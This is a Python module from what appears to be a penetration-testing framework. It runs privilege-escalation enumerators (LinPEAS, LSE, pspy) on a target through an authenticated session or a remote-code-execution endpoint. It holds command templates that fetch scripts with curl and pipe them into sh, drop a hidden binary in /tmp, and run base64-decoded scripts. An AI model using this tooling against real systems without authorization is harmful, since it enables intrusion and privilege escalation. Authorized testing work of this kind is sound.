"""Target-side post-exploitation enumeration adapters.

Runs a cached enumerator (LinPEAS / LSE / pspy) **on the authorized target** —
through an authenticated session when one is available, otherwise through the
finding's command-execution endpoint. This is the Obsidian-native integration of
the PEASS/LSE/pspy family called for in the technique mapping.

Honesty rules enforced here:

* Enumeration runs on the target; observations are attributed to the session.
* ``root_confirmed`` is derived **only** from definitive ``uid=0`` evidence
  (``delivery.verify_root_evidence``). Enumeration output alone never proves
  elevated access — it reports *opportunities*, not exploitation.
* A missing enumerator is reported as such; the network is never touched unless
  remote fetch is explicitly enabled elsewhere.
"""
from __future__ import annotations

import base64
import os
import time
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional, Tuple

from app.automation import session as session_adapters
from app.automation.delivery import (
    SUID_ENUM_COMMAND,
    count_elevation_vectors,
    deliver_rce_command,
    remote_url_for,
    resolve_enumerator,
    summarize_elevation_controls,
    verify_root_evidence,
)

#: Enumerators whose parsed output yields elevation-control vectors.
_ELEVATION_ENUMERATORS = frozenset({"lse", "linpeas", "winpeas"})

#: How a remote (non-cached) enumerator is fetched and run through an RCE
#: endpoint. Kept fixed; only used when remote fetch is enabled upstream.
_REMOTE_EXEC_TEMPLATES: Dict[str, str] = {
    "lse": "curl -sk --max-time 60 {url} | sh -s -- -l 0",
    "linpeas": "curl -sk --max-time 120 {url} | sh",
    "pspy": (
        "curl -sk --max-time 60 {url} -o /tmp/.obsidian_pspy && "
        "chmod +x /tmp/.obsidian_pspy && timeout 30 /tmp/.obsidian_pspy -pf -i 1000"
    ),
}

_MAX_INLINE = 120_000


@dataclass
class EnumerationOutcome:
    """Structured result of one target-side enumeration."""

    enumerator: str
    ran: bool
    transport: str                       # "session" | "rce" | "unavailable"
    return_code: int = -1
    output: str = ""
    vectors: Dict[str, List[str]] = field(default_factory=dict)
    root_confirmed: bool = False
    session: Optional[Dict[str, Any]] = None
    error: Optional[str] = None
    duration_ms: int = 0

    @property
    def vector_count(self) -> int:
        return count_elevation_vectors(self.vectors)

    def to_dict(self) -> Dict[str, Any]:
        return {
            "enumerator": self.enumerator,
            "ran": self.ran,
            "transport": self.transport,
            "return_code": self.return_code,
            "vector_count": self.vector_count,
            "root_confirmed": self.root_confirmed,
            "session": self.session,
            "error": self.error,
            "output": self.output[:2000],
        }


def _session_identity(target_session: Any) -> Optional[Dict[str, Any]]:
    info = getattr(target_session, "info", None)
    if hasattr(info, "describe"):
        return info.describe()
    return None


def _run_through_session(
    target_session: Any,
    enumerator: str,
    local_path: Optional[str],
    *,
    timeout: int,
) -> Tuple[int, str, str]:
    """Run a cached enumerator through an authenticated session.

    Prefers SFTP upload + exec; falls back to a base64 pipe for small scripts.
    """
    if local_path:
        remote = f"/tmp/.obsidian_{os.path.basename(local_path)}"
        put = getattr(target_session, "put_file", None)
        if callable(put) and put(local_path, remote, timeout=min(timeout, 60)):
            run = target_session.run(
                f"chmod +x {remote} 2>/dev/null; sh {remote}", timeout=timeout
            )
            return run.rc, run.stdout, run.stderr
        try:
            with open(local_path, "r", encoding="utf-8", errors="replace") as handle:
                data = handle.read()
        except OSError:
            return -1, "", "enumerator local path unreadable"
        if len(data) <= _MAX_INLINE:
            encoded = base64.b64encode(data.encode("utf-8", "replace")).decode("ascii")
            run = target_session.run(
                f"printf %s '{encoded}' | base64 -d | sh", timeout=timeout
            )
            return run.rc, run.stdout, run.stderr
        return -1, "", "enumerator too large to inline and upload failed"

    # No cached script: use the fixed enumeration command (still target-side).
    run = target_session.run(SUID_ENUM_COMMAND, timeout=timeout)
    return run.rc, run.stdout, run.stderr


def run_enumeration(
    ctx: Any,
    enumerator: str = "lse",
    *,
    timeout: Optional[int] = None,
) -> EnumerationOutcome:
    """Run a target-side enumerator. Never raises."""
    started = time.time()
    enumerator = (enumerator or "lse").lower()
    budget = int(timeout or getattr(ctx, "timeout_seconds", 120) or 120)
    identity: Optional[Dict[str, Any]] = None

    def _finish(outcome: EnumerationOutcome) -> EnumerationOutcome:
        outcome.duration_ms = int((time.time() - started) * 1000)
        return outcome

    target_session = session_adapters.open_context_session(ctx)
    local_path = resolve_enumerator(enumerator)

    if target_session is not None:
        identity = _session_identity(target_session)
        try:
            rc, stdout, stderr = _run_through_session(
                target_session, enumerator, local_path, timeout=budget
            )
        except Exception as exc:  # noqa: BLE001 — fail-soft
            return _finish(EnumerationOutcome(
                enumerator=enumerator,
                ran=False,
                transport="session",
                session=identity,
                error=f"{type(exc).__name__}: {exc}"[:512],
            ))
        return _finish(_classify(enumerator, "session", rc, stdout, stderr, identity))

    # No session: deliver through the finding's RCE endpoint.
    if local_path is None:
        url = remote_url_for(enumerator)
        template = _REMOTE_EXEC_TEMPLATES.get(enumerator)
        if url and template:
            command = template.format(url=url)
        elif enumerator in _ELEVATION_ENUMERATORS:
            command = SUID_ENUM_COMMAND
        else:
            return _finish(EnumerationOutcome(
                enumerator=enumerator,
                ran=False,
                transport="unavailable",
                error="no cached enumerator, no remote (RCE) enumerator template",
            ))
    else:
        # Cached but no session and no upload channel: fixed enumeration command.
        command = SUID_ENUM_COMMAND

    rc, stdout, stderr = deliver_rce_command(ctx, command, timeout=budget)
    return _finish(_classify(enumerator, "rce", rc, stdout, stderr, None))


def _classify(
    enumerator: str,
    transport: str,
    rc: int,
    stdout: str,
    stderr: str,
    identity: Optional[Dict[str, Any]],
) -> EnumerationOutcome:
    output = stdout or ""
    vectors = summarize_elevation_controls(output) if enumerator in _ELEVATION_ENUMERATORS else {}
    return EnumerationOutcome(
        enumerator=enumerator,
        ran=bool(output),
        transport=transport,
        return_code=rc,
        output=output,
        vectors=vectors,
        root_confirmed=verify_root_evidence(output),
        session=identity,
        error=(stderr or "")[:512] or None,
    )


__all__ = ["EnumerationOutcome", "run_enumeration", "_ELEVATION_ENUMERATORS"]
